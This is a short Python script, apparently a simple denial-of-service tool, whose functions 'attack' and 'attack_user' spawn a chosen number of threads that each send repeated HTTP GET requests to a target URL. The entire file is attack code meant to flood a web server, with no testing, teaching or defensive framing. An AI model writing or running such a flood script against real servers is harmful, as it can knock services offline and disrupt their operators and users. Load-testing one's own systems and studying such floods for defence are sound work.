import requests
import threading



def attack_user(target,one_user_attack_number):
    for i in range(one_user_attack_number):
        requests.get(target)

def attack(target , user_number , one_user_attack_number):
    for i in range(user_number):
        t = threading.Thread(target=attack_user, args=(target,one_user_attack_number))
        t.start()